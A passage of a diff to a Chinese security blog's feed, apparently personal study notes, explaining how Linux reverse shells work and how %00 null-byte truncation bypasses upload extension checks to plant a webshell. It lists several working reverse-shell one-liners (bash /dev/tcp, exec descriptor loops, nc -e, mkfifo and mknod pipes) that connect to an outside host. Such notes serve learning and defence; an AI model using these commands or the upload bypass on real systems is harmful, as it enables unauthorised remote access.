bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 </p><p>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句**</p><h2 id="常见的反弹shell-的语句怎么理解"><a href="#常见的反弹shell-的语句怎么理解" class="headerlink" title="常见的反弹shell 的语句怎么理解"></a><strong>常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure><p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p><strong>简单的解释一下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure><p>这个是一个非常经典的句子，它的原句是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure><p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p><p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p><p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure><p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><strong>简单的解释：</strong></p><p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p><p>类似的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2548&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux反弹shell（一）文件描述符与重定向&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2549&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux 反弹shell（二）反弹shell的本质&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;文件描述符&quot;&gt;&lt;a href=&quot;#文件描述符&quot; class=&quot;headerlink&quot; title=&quot;文件描述符&quot;&gt;&lt;/a&gt;&lt;strong&gt;文件描述符&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;linux文件描述符&lt;/strong&gt;：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+    
+      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>00截断</title>
+    <link href="http://yoursite.com/2020/04/21/00%E6%88%AA%E6%96%AD/"/>
+    <id>http://yoursite.com/2020/04/21/00%E6%88%AA%E6%96%AD/</id>
+    <published>2020-04-21T14:44:25.000Z</published>
+    <updated>2020-09-08T11:44:52.191Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_26090065/article/details/81458937" target="_blank" rel="noopener">00截断原理分析</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><a id="more"></a><p>加上%00</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p><p>就绕过了后缀限制，可以上传webshell啦。</p><h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><p> 然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00： </p><h1 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php 00截断"></a>php 00截断</h1><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><p>include和require一般在网站内部读取文件</p><p>file_get_contents一般用于打开一个url或一个文件</p><p>file_exists判断文件是否存在</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_26090065/article/details/81458937&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;00截断原理分析&lt;/a&gt; &lt;/p&gt;&lt;h1 id=&quot;00截断&quot;&gt;&lt;a href=&quot;#00截断&quot; class=&quot;headerlink&quot; title=&quot;%00截断&quot;&gt;&lt;/a&gt;%00截断&lt;/h1&gt;&lt;p&gt;在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束&lt;/p&gt;&lt;p&gt;比如&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://mp.csdn.net/upfiles/?filename=test.txt&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.csdn.net/upfiles/?filename=test.txt&lt;/a&gt;                                此时输出的是test.txt&lt;/p&gt;
     
     </summary>
     
